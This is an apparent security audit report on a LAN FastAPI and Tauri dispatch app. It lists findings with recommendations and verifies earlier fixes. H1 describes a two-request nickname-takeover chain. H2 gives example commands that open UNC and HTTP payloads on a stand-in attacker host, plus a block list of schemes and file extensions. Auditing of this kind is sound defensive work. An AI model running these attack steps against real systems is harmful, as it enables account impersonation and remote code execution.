# R7 Round 1 — Security audit

Scope: HEAD `306edbd` on branch `fix/r6-hardening`. Threat model: LAN-deployed FastAPI + Tauri 2.x client, nickname+cookie auth, X-YQGL-Client-Token for worker writes, no HTTPS, mostly trusted users on a corporate LAN. Per-project ACLs are intentionally absent (open dispatch board); admin flag is the only role.

## Verdict

**YELLOW — 2 HIGH, 4 MEDIUM, 4 LOW**

R7 fixed M1 (paste copy ownership) and removed the M2 nickname-409 oracle by reverting `/identify` to silent get-or-create. Admin read override on archived projects is correctly scoped to read paths only; write paths still respect the project-active filter. The new HIGH findings (H1, H2) are pre-existing — not introduced by R7 — but they need to be acknowledged before deploy, because the security posture of the system rests on them.

---

## Critical (CVE-worthy)

_None._

---

## High

### H1 — `/api/auth/identify` is a trivial nickname takeover oracle (intentional / documented)

`app/auth.py:227-244`, `app/routers/auth.py:41-60`

After R7's revert, `POST /api/auth/identify` with `{"nickname": "alice"}` returns Alice's existing user record and a fresh signed cookie for ANY unauthenticated caller. There is no proof-of-possession (no password, no token, no email, no admin approval). Anyone on the LAN can:

1. `POST /api/auth/identify {"nickname": "<victim>"}` → gets `Set-Cookie: yqgl_id=<signed>` for victim's account.
2. `POST /api/client-devices/register` → gets a `client_token` granting WRITE auth on victim's behalf.
3. From there: claim, deliver, comment, change DDL, upload — all as the victim.

The README/comments call this "LAN/nickname identity model" and treat the LAN as a trust boundary. That's a deliberate trade-off; the prior 409 oracle (M2) was reverted because it broke real onboarding (users routinely clear cookies / swap devices). However, the trust posture means **anyone who can reach 192.168.5.53:8080 has full impersonation of every account**, including admins. Two implications worth flagging:

- The `is_admin` flag offers **no protection** against an attacker who knows an admin's nickname. `set_user_admin`, `delete_user`, `finalize-summary`, and `reindex_knowledge` are admin-gated but the admin role is reachable in two HTTP calls.
- The `_ensure_runtime_config` check on `cookie_secret` (main.py:153) is necessary but insufficient: even with a strong secret, the server happily mints valid cookies on demand.

**Recommendation**: This is acceptable IF the LAN is genuinely trusted AND you can guarantee no malicious actor reaches the server port. Before any of the following, harden identify: opening the server to VPN, exposing to multi-tenant Wi-Fi, or running on an untrusted SSID. Minimum hardening: require admin approval to mint cookies for users flagged `is_admin=True`. Better: ship a per-user shared-secret bootstrap or move to SSO before the next milestone.

### H2 — `open_folder` Tauri command spawns arbitrary executables with no path validation

`client-tauri/src-tauri/src/commands/shell.rs:3-18`

The command is exposed to the frontend webview and takes `path: String`, then spawns:
- Windows: `explorer.exe "<path>"`
- macOS: `open "<path>"`
- Linux: `xdg-open "<path>"`

There is no canonicalization, no allow-list, no scope check, no check that `<path>` is a directory. Consequences:

- Windows `explorer.exe <foo.exe>` opens File Explorer to the parent. But `explorer.exe shell:Startup`, `explorer.exe \\attacker.example\share\malware.lnk`, and `explorer.exe ms-cxh://...` open various shell handlers / launch UNC content. `explorer.exe http://attacker.example/payload` opens the default browser and can drop a file via download.
- macOS `open <file.app>` launches an `.app` bundle. `open "x-apple-..."` triggers URL handlers.
- Linux `xdg-open <file.desktop>` honours `Exec=` keys and can launch arbitrary commands depending on file-manager and XDG handlers.

Exploit chain requires JavaScript execution in the webview. The CSP `script-src 'self'` blocks inline JS, but the React app renders user-controlled markdown (requirement summary, comments, delivery doc, LLM output, drive comments) in numerous places. If any markdown renderer or third-party React component opens a sink for `dangerouslySetInnerHTML` or unescaped attribute injection, this command becomes a one-call RCE. Combined with H1 (an attacker can register as any user and push poisoned content into the server) this is **remotely reachable**.

**Recommendation**: Validate `path` is an absolute, canonicalized directory that is a descendant of `config.sync_root` or `config.drive_sync_root`, AND that no path component is a symlink. Reject everything else (`open https://...`, UNC paths, `shell:` schemes, `.lnk`, `.desktop`, `.app`, `.exe`, `.bat`, `.cmd`, `.scr`, `.url`). Use `dunce::canonicalize` on Windows so UNC normalization is deterministic.

---

## Medium

### M3 — `list_projects` exposes soft-deleted projects to non-admins

`app/routers/projects.py:24-37`

`GET /api/projects?state=deleted` (or `?state=archived`, `?state=all`) is gated only by `Depends(current_user)`. Any authenticated user can enumerate every soft-deleted project: name, slug, description, owner_nickname, deleted_at, deleted_by_nickname. This contradicts the comment in `get_project` (line 64) explicitly noting "Non-admins shouldn't be able to GET soft-deleted projects' metadata by guessing IDs — leaks the existence of deleted projects". The single-row endpoint enforces it; the list endpoint does not.

**Recommendation**: Restrict `state in {"deleted", "archived", "all"}` to admins. Non-admins always get `state=active`.

### M4 — SSE `/api/push/stream/req/{req_id}` has no per-requirement authorization

`app/routers/push.py:59-66`

Any authenticated user can subscribe to `req:{any_id}` and receive: `comment.added` (with full body), `ai.thinking` / `ai.text` (200-char chunks of LLM reasoning), `ai.tool_call`, `requirement.updated`, `delivery.doc_ready`, `workspace.updated`. This leaks the private clarification dialogue and comment stream for requirements the user wouldn't be allowed to read via the REST endpoints (`PRIVATE_REQUIREMENT_STATUSES`: draft / clarifying / summary_ready).

The companion `/api/push/stream/me` correctly scopes to `user:{auth_user.id}`. The fix mirrors that pattern: resolve `req_id`, call `can_view_requirement_record(req, user)`, 403 if not allowed.

**Recommendation**: Add a permission check before opening the stream (mirroring `comments.list_comments`'s gate).

### M5 — `restore_project` + nickname recycling = silent project-ownership transfer

`app/routers/projects.py:76-83`, `app/routers/users.py:127-133`

`_require_owner` matches by `p.owner_nickname == user.nickname` (string equality). When `delete_user` tombstones a user, it frees the original nickname. A new person who later identifies with that same nickname inherits ownership over all the deleted user's projects — including the ability to `POST /restore` projects the previous owner soft-deleted (and the new owner may not know existed). Combined with M3 (deleted projects enumerable), the new owner can audit `?state=deleted` to discover what to resurrect.

This is an *information* loss as much as it is an *access* loss: the new owner can also `POST /archive` or `DELETE` projects they did not create, simply because they share a string nickname with the historical creator.

**Recommendation**: Match ownership by `created_by_user_id` (add the column if absent) instead of nickname. Migration: backfill from `owner_nickname` joined to live users at migration time; rows with no matching live user become admin-only.

### M6 — Knowledge corpus exposes drive-file / meeting / project content cross-project to all users

`app/services/knowledge.py:67-80, 159-297, 425-486`

`search_knowledge` enforces per-requirement visibility via `_requirement_visible`. But KnowledgeDocument rows with `requirement_id IS NULL` (source_type in {`project`, `drive_file`, `meeting`, `meeting_insight`}) skip that check entirely — the visibility branch on line 80 returns `True` when `req_id` is None. That means:

- Drive file parsed text is searchable by every authenticated user across every project.
- Meeting transcripts/minutes are searchable cross-project.
- Project descriptions / slugs / owners are searchable cross-project.

This is consistent with the wider "open dispatch board" model, but a user uploading a privacy-sensitive contract to a project drive doesn't expect that file's parsed text body to surface in another team member's grep. The drive UI's per-project navigation gives a false sense of project boundary.

**Recommendation**: Either (a) document explicitly that the drive is global-readable, or (b) gate non-requirement-attached docs on a per-project ACL that mirrors any future drive ACL.

---

## Low / informational

### L5 — `safe_component` / `safe_relative_path` don't block Windows reserved names

`client-tauri/src-tauri/src/sync.rs:328-368`

Both helpers reject `/`, `\`, `:`, `..`, and absolute paths. They do NOT reject:
- Windows device names (`CON`, `PRN`, `AUX`, `NUL`, `COM1..9`, `LPT1..9`) with or without extensions. Writing to `CON.txt` on Windows opens the console device and can hang the sync worker.
- Trailing dots / spaces (`evil .` → Windows strips, may collide with `evil`).
- Names containing NUL (`\0`) — fs would error but error path is awkward.

A malicious server (or a compromised admin) can craft an attachment / drive item filename that triggers these on Windows clients. Low severity because reaching server-side write requires already being an authenticated admin or owner; impact is local-DoS on the desktop client, not RCE.

**Recommendation**: After `safe_component`, additionally reject the case-insensitive reserved name set and any segment ending in `.` or ` `.

### L6 — `list_users?include_deleted=true` available to all users

`app/routers/users.py:21-56`

Tombstoned users are masked to "name（已停用）" via `display_name`, but the `deleted_at` field is exposed in `UserOut`, letting any caller enumerate deleted accounts and their deletion times. Low impact — names are recyclable and the masking already implies the account exists.

**Recommendation**: Gate `include_deleted=True` to admins.

### L7 — `cookie_secure=False` default and no HTTPS expected on LAN

`app/config.py:13`, `app/main.py:150-157`

`COOKIE_SECRET` and CORS wildcard are correctly rejected in production. `cookie_secure` defaults to `False` and is NOT checked by `_validate_runtime_config`. Per project design the LAN is plain HTTP, so the cookie is sniffable on the wire; an attacker who can ARP-spoof the LAN can lift any active session cookie. Within the documented threat model this is intentional but worth confirming in the deploy checklist.

### L8 — Install scripts fetch over plain HTTP from the configured server

`client/install-client.ps1:16-20`, `client/install-client.sh:21-24`

`Invoke-WebRequest` / `curl -fsSL` pull `yqgl_tray.py`, `yqgl_dashboard.py`, `requirements.txt`, `launch.*` over plain HTTP from `$YQGL_SERVER`. No checksum, no signature, no TLS. A LAN attacker who can ARP-spoof or DNS-poison `192.168.5.53` to the install endpoints can substitute malicious Python that runs on every workstation that installs the client. No `iex` / `eval` is present, but `pip install -r requirements.txt` runs immediately after, so a poisoned `requirements.txt` is equivalent to RCE on the installing user's box.

**Recommendation**: Ship a signed installer (you already do for `.nsis`/`.dmg`) and deprecate the curl-pipe-python flow, or at minimum publish SHA256 of the official scripts on a HTTPS channel and add a sha check before execution.

---

## R7 fix verification

### Admin read override restored — does it block write?

`app/services/permissions.py:32-119` — **PASS**. Verified by code reading:
- `can_view_requirement_record`, `can_view_requirement_assets`, `can_ack_requirement_sync` (lines 50, 63, 73): all check `is_admin(user)` FIRST and return True regardless of project state.
- `can_add_requirement_attachment`, `can_manage_requirement_assignees`, `can_claim_requirement`, `can_work_requirement` (lines 83, 91, 106, 114): all check `requirement_project_is_active(req)` FIRST and bail with False before any admin bypass.

Module docstring (lines 7-22) correctly states the policy. Write functions cannot accidentally allow archived-project mutation via admin override.

Caveat: most file-serving endpoints (`attachments.download_attachment` at `app/routers/attachments.py:341-352`, `chat.list_messages` at `app/routers/chat.py:251-272`, `sync.sync_manifest` at `app/routers/sync.py:88-95`) call `_require_req`/`_active_requirement_query` which filters out archived/deleted projects BEFORE the `can_view_*` admin check runs. So the admin read override is effectively dead for those endpoints. This is *consistent with* the write block but contradicts the stated audit-visibility intent. Behaviour is safe; intent is partially unrealised. Worth noting if admin auditability on archived projects is required, you'd need to relax `_require_req` for admins (and then re-verify each write endpoint).

### M1 paste copy fix — actually applied?

`app/routers/project_drive.py:938-1006` — **PASS**. 
- `paste_drive_items` copy branch (line 950-956) iterates `for item in items: _require_manage_item(db, item, user)` before `_copy_item`. Comment on line 951-954 documents the rationale.
- `copy_one_drive_item` (line 997) calls `_require_manage_item(db, item, user)` after `_require_item`.
- Move branch (line 969) was already gated.

### M2 nickname oracle — gone after `/identify` revert?

`app/routers/auth.py:41-60`, `app/auth.py:227-244` — **PASS**. The 409 branch is gone; `get_or_create_user` always returns the existing user with no proof check. The oracle is closed. **The trade-off cost is H1 above** — this is the deliberate decision documented in the commit message; it just needs the deploy-readiness checklist to acknowledge that LAN reachability == full impersonation.

---

## Coverage

| Area | Files / endpoints reviewed | Outcome |
|------|----------------------------|---------|
| Permission bypass surfaces | `app/services/permissions.py`, all `can_*` callers in `app/routers/*.py` | Clean — write functions correctly gate on `requirement_project_is_active` before admin bypass |
| Soft-delete / archive leaks | `projects.py`, `users.py`, `requirements.py`, `chat.py`, `comments.py`, `knowledge.py`, `notifications.py`, `project_drive.py`, `sync.py`, `attachments.py` | M3, M5, M6, L6 — partial leaks via list endpoints and cross-project knowledge |
| Path traversal & file safety | `attachments.py` (`_require_req`, `safe_filename`), `delivery_upload.py`, `services/delivery_doc.py` (`_safe_zip_name`, `_safe_extract_entries`), `client-tauri/src-tauri/src/sync.rs`, `commands/submitter.rs` | Zip slip blocked; basic traversal blocked; L5 Windows reserved names not covered |
| Auth | `app/auth.py`, `routers/auth.py`, `routers/client_devices.py`, R7 `/identify` revert | H1 chain attack; cookie verification correct; worker token correctly stored as sha256 hash; device revoke + cookie rotation on delete_user are sound |
| CORS / CSP | `app/main.py:195-201`, `_validate_runtime_config` (153-156), `tauri.conf.json:31` | CORS wildcard rejected in production; CSP `connect-src` permissive but unavoidable for runtime-configurable server (Codex L1 still stands) |
| Tauri capabilities | `client-tauri/src-tauri/capabilities/default.json`, `commands/shell.rs`, `commands/config.rs`, `deep_link.rs` | Capability set minimal; deep-link host whitelist + path-traversal stripping correct; **H2 in `open_folder`** |
| Information disclosure | SSE channels (`push.py`), list endpoints, error responses | M3, M4 confirmed; per-user SSE stream correctly scoped |
| Race conditions | CAS patterns in `update_status`, `claim`, `submit`, `delivery_upload.finalize` | All status writes use compare-and-swap; rollback path on finalize is correct |
| Install scripts | `client/install-client.ps1`, `client/install-client.sh` | No `iex`/`eval`, no TLS bypass; L8 plain-HTTP fetch is supply-chain risk on hostile LAN |
| Dependencies | `app/pyproject.toml`, `client/requirements.txt`, `client-tauri/src-tauri/Cargo.toml`, `Cargo.lock` (40-pkg spot check) | All upstream / well-known. No suspicious typosquats. |

Round-2 candidates to confirm fix:
- H1 acknowledged in deploy checklist (or hardened)
- H2 path-validated in `open_folder`
- M3, M4, M5 closed
- M6 documented or scoped
- L5–L8 noted / accepted
